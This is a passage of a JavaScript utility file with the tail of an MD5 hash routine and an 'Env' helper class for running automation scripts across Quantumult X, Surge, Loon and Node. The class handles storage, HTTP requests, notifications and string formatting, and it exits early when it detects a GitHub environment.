  function i(a, d, f, g, h, i, j) {
    a = c(a, c(c(e(d, f, g), h), j));
    return c(b(a, i), d);
  }
  function j(a, d, e, g, h, i, j) {
    a = c(a, c(c(f(d, e, g), h), j));
    return c(b(a, i), d);
  }
  function k(a, d, e, f, h, i, j) {
    a = c(a, c(c(g(d, e, f), h), j));
    return c(b(a, i), d);
  }
  function l(a) {
    for (var b, c = a.length, d = c + 8, e = (d - d % 64) / 64, f = 16 * (e + 1), g = new Array(f - 1), h = 0, i = 0; c > i;) {
      b = (i - i % 4) / 4;
      h = i % 4 * 8;
      g[b] = g[b] | a.charCodeAt(i) << h;
      i++;
    }
    b = (i - i % 4) / 4;
    h = i % 4 * 8;
    g[b] = g[b] | 128 << h;
    g[f - 2] = c << 3;
    g[f - 1] = c >>> 29;
    return g;
  }
  function m(a) {
    var b,
      c,
      d = "",
      e = "";
    for (c = 0; 3 >= c; c++) {
      b = a >>> 8 * c & 255;
      e = "0" + b.toString(16);
      d += e.substr(e.length - 2, 2);
    }
    return d;
  }
  function n(a) {
    a = a.replace(/\r\n/g, "\n");
    for (var b = "", c = 0; c < a.length; c++) {
      var d = a.charCodeAt(c);
      128 > d ? b += String.fromCharCode(d) : d > 127 && 2048 > d ? (b += String.fromCharCode(d >> 6 | 192), b += String.fromCharCode(63 & d | 128)) : (b += String.fromCharCode(d >> 12 | 224), b += String.fromCharCode(d >> 6 & 63 | 128), b += String.fromCharCode(63 & d | 128));
    }
    return b;
  }
  var o,
    p,
    q,
    r,
    s,
    t,
    u,
    v,
    w,
    x = [],
    y = 7,
    z = 12,
    A = 17,
    B = 22,
    C = 5,
    D = 9,
    E = 14,
    F = 20,
    G = 4,
    H = 11,
    I = 16,
    J = 23,
    K = 6,
    L = 10,
    M = 15,
    N = 21;
  for (a = n(a), x = l(a), t = 1732584193, u = 4023233417, v = 2562383102, w = 271733878, o = 0; o < x.length; o += 16) {
    p = t;
    q = u;
    r = v;
    s = w;
    t = h(t, u, v, w, x[o + 0], y, 3614090360);
    w = h(w, t, u, v, x[o + 1], z, 3905402710);
    v = h(v, w, t, u, x[o + 2], A, 606105819);
    u = h(u, v, w, t, x[o + 3], B, 3250441966);
    t = h(t, u, v, w, x[o + 4], y, 4118548399);
    w = h(w, t, u, v, x[o + 5], z, 1200080426);
    v = h(v, w, t, u, x[o + 6], A, 2821735955);
    u = h(u, v, w, t, x[o + 7], B, 4249261313);
    t = h(t, u, v, w, x[o + 8], y, 1770035416);
    w = h(w, t, u, v, x[o + 9], z, 2336552879);
    v = h(v, w, t, u, x[o + 10], A, 4294925233);
    u = h(u, v, w, t, x[o + 11], B, 2304563134);
    t = h(t, u, v, w, x[o + 12], y, 1804603682);
    w = h(w, t, u, v, x[o + 13], z, 4254626195);
    v = h(v, w, t, u, x[o + 14], A, 2792965006);
    u = h(u, v, w, t, x[o + 15], B, 1236535329);
    t = i(t, u, v, w, x[o + 1], C, 4129170786);
    w = i(w, t, u, v, x[o + 6], D, 3225465664);
    v = i(v, w, t, u, x[o + 11], E, 643717713);
    u = i(u, v, w, t, x[o + 0], F, 3921069994);
    t = i(t, u, v, w, x[o + 5], C, 3593408605);
    w = i(w, t, u, v, x[o + 10], D, 38016083);
    v = i(v, w, t, u, x[o + 15], E, 3634488961);
    u = i(u, v, w, t, x[o + 4], F, 3889429448);
    t = i(t, u, v, w, x[o + 9], C, 568446438);
    w = i(w, t, u, v, x[o + 14], D, 3275163606);
    v = i(v, w, t, u, x[o + 3], E, 4107603335);
    u = i(u, v, w, t, x[o + 8], F, 1163531501);
    t = i(t, u, v, w, x[o + 13], C, 2850285829);
    w = i(w, t, u, v, x[o + 2], D, 4243563512);
    v = i(v, w, t, u, x[o + 7], E, 1735328473);
    u = i(u, v, w, t, x[o + 12], F, 2368359562);
    t = j(t, u, v, w, x[o + 5], G, 4294588738);
    w = j(w, t, u, v, x[o + 8], H, 2272392833);
    v = j(v, w, t, u, x[o + 11], I, 1839030562);
    u = j(u, v, w, t, x[o + 14], J, 4259657740);
    t = j(t, u, v, w, x[o + 1], G, 2763975236);
    w = j(w, t, u, v, x[o + 4], H, 1272893353);
    v = j(v, w, t, u, x[o + 7], I, 4139469664);
    u = j(u, v, w, t, x[o + 10], J, 3200236656);
    t = j(t, u, v, w, x[o + 13], G, 681279174);
    w = j(w, t, u, v, x[o + 0], H, 3936430074);
    v = j(v, w, t, u, x[o + 3], I, 3572445317);
    u = j(u, v, w, t, x[o + 6], J, 76029189);
    t = j(t, u, v, w, x[o + 9], G, 3654602809);
    w = j(w, t, u, v, x[o + 12], H, 3873151461);
    v = j(v, w, t, u, x[o + 15], I, 530742520);
    u = j(u, v, w, t, x[o + 2], J, 3299628645);
    t = k(t, u, v, w, x[o + 0], K, 4096336452);
    w = k(w, t, u, v, x[o + 7], L, 1126891415);
    v = k(v, w, t, u, x[o + 14], M, 2878612391);
    u = k(u, v, w, t, x[o + 5], N, 4237533241);
    t = k(t, u, v, w, x[o + 12], K, 1700485571);
    w = k(w, t, u, v, x[o + 3], L, 2399980690);
    v = k(v, w, t, u, x[o + 10], M, 4293915773);
    u = k(u, v, w, t, x[o + 1], N, 2240044497);
    t = k(t, u, v, w, x[o + 8], K, 1873313359);
    w = k(w, t, u, v, x[o + 15], L, 4264355552);
    v = k(v, w, t, u, x[o + 6], M, 2734768916);
    u = k(u, v, w, t, x[o + 13], N, 1309151649);
    t = k(t, u, v, w, x[o + 4], K, 4149444226);
    w = k(w, t, u, v, x[o + 11], L, 3174756917);
    v = k(v, w, t, u, x[o + 2], M, 718787259);
    u = k(u, v, w, t, x[o + 9], N, 3951481745);
    t = c(t, p);
    u = c(u, q);
    v = c(v, r);
    w = c(w, s);
  }
  var O = m(t) + m(u) + m(v) + m(w);
  return O.toLowerCase();
}
function Env(name, env) {
  "undefined" != typeof process && JSON.stringify(process.env).indexOf("GITHUB") > -1 && process.exit(0);
  return new class {
    constructor(name, env) {
      this.name = name;
      this.notifyStr = "";
      this.startTime = new Date().getTime();
      Object.assign(this, env);
      console.log(`${this.name} 开始运行：\n`);
    }
    isNode() {
      return "undefined" != typeof module && !!module.exports;
    }
    isQuanX() {
      return "undefined" != typeof $task;
    }
    isSurge() {
      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
    }
    isLoon() {
      return "undefined" != typeof $loon;
    }
    getdata(t) {
      let e = this.getval(t);
      if (/^@/.test(t)) {
        const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t),
          r = s ? this.getval(s) : "";
        if (r) {
          try {
            const t = JSON.parse(r);
            e = t ? this.lodash_get(t, i, "") : e;
          } catch (t) {
            e = "";
          }
        }
      }
      return e;
    }
    setdata(t, e) {
      let s = !1;
      if (/^@/.test(e)) {
        const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e),
          o = this.getval(i),
          h = i ? "null" === o ? null : o || "{}" : "{}";
        try {
          const e = JSON.parse(h);
          this.lodash_set(e, r, t);
          s = this.setval(JSON.stringify(e), i);
        } catch (e) {
          const o = {};
          this.lodash_set(o, r, t);
          s = this.setval(JSON.stringify(o), i);
        }
      } else {
        s = this.setval(t, e);
      }
      return s;
    }
    getval(t) {
      return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null;
    }
    setval(t, e) {
      return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null;
    }
    send(m, t, e = () => {}) {
      if (m != "get" && m != "post" && m != "put" && m != "delete") {
        console.log(`无效的http方法：${m}`);
        return;
      }
      if (m == "get" && t.headers) {
        delete t.headers["Content-Type"];
        delete t.headers["Content-Length"];
      } else {
        if (t.body && t.headers) {
          if (!t.headers["Content-Type"]) {
            t.headers["Content-Type"] = "application/x-www-form-urlencoded";
          }
        }
      }
      if (this.isSurge() || this.isLoon()) {
        if (this.isSurge() && this.isNeedRewrite) {
          t.headers = t.headers || {};
          Object.assign(t.headers, {
            "X-Surge-Skip-Scripting": !1
          });
        }
        let conf = {
          method: m,
          url: t.url,
          headers: t.headers,
          timeout: t.timeout,
          data: t.body
        };
        if (m == "get") {
          delete conf.data;
        }
        $axios(conf).then(t => {
          const {
            status: i,
            request: q,
            headers: r,
            data: o
          } = t;
          e(null, q, {
            statusCode: i,
            headers: r,
            body: o
          });
        }).catch(err => console.log(err));
      } else {
        if (this.isQuanX()) {
          t.method = m.toUpperCase();
          this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
            hints: !1
          }));
          $task.fetch(t).then(t => {
            const {
              statusCode: i,
              request: q,
              headers: r,
              body: o
            } = t;
            e(null, q, {
              statusCode: i,
              headers: r,
              body: o
            });
          }, t => e(t));
        } else {
          if (this.isNode()) {
            this.got = this.got ? this.got : require("got");
            const {
              url: s,
              ...i
            } = t;
            this.instance = this.got.extend({
              followRedirect: false
            });
            this.instance[m](s, i).then(t => {
              const {
                statusCode: i,
                request: q,
                headers: r,
                body: o
              } = t;
              e(null, q, {
                statusCode: i,
                headers: r,
                body: o
              });
            }, t => {
              const {
                message: s,
                response: i
              } = t;
              e(s, i, i && i.body);
            });
          }
        }
      }
    }
    time(t) {
      let e = {
        "M+": new Date().getMonth() + 1,
        "d+": new Date().getDate(),
        "h+": new Date().getHours(),
        "m+": new Date().getMinutes(),
        "s+": new Date().getSeconds(),
        "q+": Math.floor((new Date().getMonth() + 3) / 3),
        S: new Date().getMilliseconds()
      };
      /(y+)/.test(t) && (t = t.replace(RegExp.$1, (new Date().getFullYear() + "").substr(4 - RegExp.$1.length)));
      for (let s in e) new RegExp("(" + s + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? e[s] : ("00" + e[s]).substr(("" + e[s]).length)));
      return t;
    }
    async showmsg() {
      if (!this.notifyStr) {
        return;
      }
      let notifyBody = this.name + " 运行通知\n\n" + this.notifyStr;
      if ($.isNode()) {
        console.log("\n============== 推送 ==============");
        await notify.sendNotify(this.name, notifyBody);
      } else {
        this.msg(notifyBody);
      }
    }
    logAndNotify(str) {
      console.log(str);
      this.notifyStr += str;
      this.notifyStr += "\n";
    }
    msg(e = t, s = "", i = "", r) {
      const o = t => {
        if (!t) {
          return t;
        }
        if ("string" == typeof t) {
          return this.isLoon() ? t : this.isQuanX() ? {
            "open-url": t
          } : this.isSurge() ? {
            url: t
          } : void 0;
        }
        if ("object" == typeof t) {
          if (this.isLoon()) {
            let e = t.openUrl || t.url || t["open-url"],
              s = t.mediaUrl || t["media-url"];
            return {
              openUrl: e,
              mediaUrl: s
            };
          }
          if (this.isQuanX()) {
            let e = t["open-url"] || t.url || t.openUrl,
              s = t["media-url"] || t.mediaUrl;
            return {
              "open-url": e,
              "media-url": s
            };
          }
          if (this.isSurge()) {
            let e = t.url || t.openUrl || t["open-url"];
            return {
              url: e
            };
          }
        }
      };
      this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r)));
      let h = ["", "============== 系统通知 =============="];
      h.push(e);
      s && h.push(s);
      i && h.push(i);
      console.log(h.join("\n"));
    }
    getMin(a, b) {
      return a < b ? a : b;
    }
    getMax(a, b) {
      return a < b ? b : a;
    }
    padStr(num, length, padding = "0") {
      let numStr = String(num);
      let numPad = length > numStr.length ? length - numStr.length : 0;
      let retStr = "";
      for (let i = 0; i < numPad; i++) {
        retStr += padding;
      }
      retStr += numStr;
      return retStr;
    }
    json2str(obj, c, encodeUrl = false) {
      let ret = [];
      for (let keys of Object.keys(obj).sort()) {
        let v = obj[keys];
        if (v && encodeUrl) {
          v = encodeURIComponent(v);
        }
        ret.push(keys + "=" + v);
      }
      return ret.join(c);
    }
    str2json(str, decodeUrl = false) {
      let ret = {};
      for (let item of str.split("&")) {
        if (!item) {
          continue;
        }
        let idx = item.indexOf("=");
        if (idx == -1) {
          continue;
        }
        let k = item.substr(0, idx);
        let v = item.substr(idx + 1);
        if (decodeUrl) {
          v = decodeURIComponent(v);
        }
        ret[k] = v;
      }
      return ret;
    }
    randomString(len, charset = "abcdef0123456789") {
      let str = "";
      for (let i = 0; i < len; i++) {
        str += charset.charAt(Math.floor(Math.random() * charset.length));
      }
      return str;
    }
    wait(t) {
      return new Promise(e => setTimeout(e, t));
    }
    done(t = {}) {
      const e = new Date().getTime(),
        s = (e - this.startTime) / 1000;
      console.log(`\n${this.name} 运行结束，共运行了 ${s} 秒！`);
      if (this.isSurge() || this.isQuanX() || this.isLoon()) {
        $done(t);
      }
    }
  }(name, env);
}